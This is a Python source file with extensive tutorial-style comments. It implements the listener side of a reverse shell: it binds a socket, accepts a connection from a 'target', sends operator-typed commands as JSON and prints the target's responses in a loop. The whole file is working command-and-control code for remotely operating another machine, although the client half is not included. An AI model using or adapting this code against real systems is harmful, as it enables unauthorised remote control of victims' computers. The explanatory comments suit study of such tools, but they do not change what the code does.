# Import 'Socket' and JSON libraries
import socket
import json

# Used to carry the commands inputted by the server.
def reliable_send(data):
	# jsondata is the variable storing the output of the json.dumps() function on the input command
	# Why use json.dumps()? json.dumps() function converts the input into a string that can be transmitted over a network.
	# Python is no good at creating useable / transmittable strings, but JSON conventions do just that for transmittability.
	jsondata = json.dumps(data)
	# 'target' refers to the variable defined later in the program.
	target.send(jsondata.encode())

def reliable_recv():
	# First, create a 'data' variable with an empty string
	data = ''
	#then create an infinite loop for receiving responses from the target
	while True:
		try:
			# The 'recv' function below is a from the 'socket' library and takes the data from the target ip defined later in the program.
			# 1024 is the number of bytes to process. We also decode the data (encoded above with jsondata.encode()).
			# rstrip() removes trailing characters from the 1024 byte length.
			data = data + target.recv(1024).decode().rstrip()
			# Using json.loads() to return the received info from the target - string is created with json.dumps() and read with json.loads().
			return json.loads(data)
		except ValueError:
			continue

# Used to send commands to the target system and receive responses from the target system
def target_communication():
	# Create infinite loop
	while True:
		# Create a variable from user input with a shell-type prompt including the target IP (%s returns the 'ip' variable defined later on as a string.
		command = input('** Target~%s: ' %str(ip))
		# reliable_send function defined as the function that send the input commend to the target.
		reliable_send(command)
		# if the input is 'quit', then break the infinite loop, closing the connection with the target.
		if command == 'quit':
			break
		else:
			# so long as the input isn't 'quit', the target response to the input command will be stored as variable 'result'.
			# the 'result' variable will be created from the new function above, 'reliable_recv', which returns the target response to the input command 'command', which is sent by function reliable_send().
			result = reliable_recv()
			# ... then the variable is printed!
			print(result)

print('[+] Initiating server...')

# Create the socket and bind to the IP and port
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('192.168.86.32', 1988))

print('[+] Server initiated successfully!')

print('[+] Listening for incoming connections...')

# Start listening for up to 10 connections
sock.listen(10)

# Set the variable for storing the accepted connection (the socket object and the incoming IP)
target, ip = sock.accept()
print('[+] Incoming connection from: ' + str(ip))

target_communication()
